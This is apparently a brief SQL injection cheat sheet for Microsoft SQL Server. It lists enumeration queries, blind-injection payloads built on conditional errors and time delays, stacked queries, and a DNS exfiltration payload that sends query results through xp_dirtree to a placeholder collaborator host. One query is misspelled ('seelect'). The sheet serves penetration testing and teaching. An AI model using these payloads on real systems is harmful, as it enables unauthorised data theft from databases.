## summary

Useful SQL commands for mssql dbms

## string concatenation
`'foo'+'bar'`

## substring
`SUBSTRING('foobar', 4, 2)`

## comments
`--comments`

## database version
`select @@version`

## database contents
`seelect * from information_schema.tables`

`select * from information_schema.columns where table_name = 'TABLE-NAME-HERE'`

## conditional errors
`select case when (YOUR-CONDITION-HERE) then 1/0 else null end`

## batched (or stacked) queries
`query-1-here; query-2-here`

## time delays
`waitfor delay '0:0:10'`

## conditional time delays
`if (YOUR-CONDITION-HERE) waitfor delay '0:0:10'`

## dns lookup
`exec master..xp_dirtree '//YOUR-COLLABORATOR.burpcollaborator.net/a'`

## dns lookup with data exfiltration
`declare @p varchar(1024);set @p=(select YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.YOUR-COLLABORATOR.burpcollaborator.net/a"')`



